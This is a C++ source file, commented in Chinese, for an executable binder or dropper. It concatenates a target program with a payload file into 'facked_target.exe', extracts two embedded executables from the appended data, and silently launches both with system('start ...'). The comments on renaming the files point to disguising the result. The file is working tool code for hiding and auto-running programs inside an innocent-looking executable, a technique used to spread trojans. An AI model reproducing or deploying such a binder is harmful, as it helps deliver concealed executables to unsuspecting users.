//http://52sye.com/NewsInfo/1347405.html
//facked_target改成其他名字，f1.exe及f2.exe也是，f1及f2產生的路徑和打開路徑一致 
//|target.exe|test1.exe|test2.exe|len1|len2|
#include <stdio.h>
#include<iostream>
#include<io.h>
//#include <string.h>
//#include <stdlib.h>

int main(int argc, char *argv[]){//如果f1.exe 和 f2.exe不存在，則重新產生    
    if(access("f1.exe",0) < 0 || access("f2.exe",0) < 0){ //把target放到tmp.exe的前面，並產生facked_target.exe 
    	long SourceLength = 0;//讀取檔案的長度
		long TargetLength = 0;//
		char file1_len_buffer[30];//f1的檔案大小紀錄位置 
    	char file2_len_buffer[30];//f2的檔案大小紀錄位置  
    	long f1_size=0,f2_size=0;
    	FILE *fp,*fp1,*fp2;//facked_target.exe 新的檔案1 新的檔案2 
    	
    	if(access("facked_target.exe",0) < 0)//第一次要做，之後判斷自己存在後就不用再產生		 
            system("copy /b target.exe+tmp.exe facked_target.exe"); 

        fp=fopen("facked_target.exe","rb");// localfile檔名
        if(NULL == fp){
    	}
		else{//利用facked_target.exe，生成f1.exe和f2.exe        
        	fseek(fp, 0, SEEK_END);/* SEEK_END 位移的起算位址 = 檔案結尾 */
        	SourceLength = ftell(fp);/* 得到facked_target.exe大小 */ 		           
       
			fseek(fp, 0-60, SEEK_END);//後30+30為f1和f2的檔案大小紀錄檔         
   
        	for(int i=0;i<30;i++)
       		 	fread(&file1_len_buffer[i], sizeof(char), 1, fp);   
			     	      
			for(int i=0;i<30;i++)
        		fread(&file2_len_buffer[i], sizeof(char), 1, fp);        	       	
		    			
	        for(int i=0;i<30;i++){	
	    	    long ten=1;			
	    		for(int j=0;j<30-i;j++){
		   	 		if(j==0){			
		    		  ten=1;
					      //printf("ten=%d\n", ten);
		        	}
			    	else{		
			        	ten*=10;
	     	    	}
		    	}				
		        f1_size = f1_size + ((int)file1_len_buffer[i]-48)* ten;		
			    f2_size = f2_size + ((int)file2_len_buffer[i]-48)* ten;		
	        }
		    
    	   	//f1_size=atoi(file1_len_buffer);
    	    //f2_size=atoi(file2_len_buffer);
    	    //printf("f1_size=%d, f2_size=%d\n",f1_size,f2_size);
    	    //system("pause");
        
    	    TargetLength = SourceLength-f1_size-f2_size-60;/* 得到target.exe的大小 */ 

			fseek(fp, TargetLength, SEEK_SET);//指到檔案1的位置       
			unsigned char *f1_buff = new unsigned char[f1_size];//分配緩衝區給檔案1 				
        	for(int i=0;i<f1_size;i++)//讀出來，產生新的檔案
        		fread(&f1_buff[i], sizeof(char), 1, fp);        	
            
        	fp1=fopen("f1.exe","wb");// localfile檔名 
        
        	if( NULL == fp1 ){
        	}
			else{  
			    for(int i=0;i<f1_size;i++)
		       		fwrite(&f1_buff[i],1,sizeof(char),fp1);
	       
	    	   	//free(f1_buff);
			    fclose(fp1);
		   
			    system("start f1.exe"); //啟動f1.exe		   
			} 
			         
    	    fseek(fp, TargetLength+f1_size, SEEK_SET);//指到檔案2的位置      
			unsigned char *f2_buff = new unsigned char[f2_size];//分配緩衝區給檔案2 				
    	    for(int i=0;i<f2_size;i++)//讀出來，產生新的檔案
    	    	fread(&f2_buff[i], sizeof(char), 1, fp);        	
            
    	    fp2=fopen("f2.exe","wb");// localfile檔名 
        
    	    if( NULL == fp2 ){
    	    }
			else{  
			   for(int i=0;i<f2_size;i++)
			        fwrite(&f2_buff[i],1,sizeof(char),fp2);
	       
		       //free(f2_buff);
			   fclose(fp2);
		   
			   system("start f2.exe"); //啟動f2.exe
			   //system("taskkill /f /im facked_target.exe");
			}     
		
		fclose(fp);     
    	}
    } 
    else{//f1及f2執行檔已經存在，不用再產生，速度較快 
        system("start f2.exe"); 
    	system("start f1.exe");

	}                	         
    //system("taskkill /f /im facked_target.exe");
    return 0; 
}
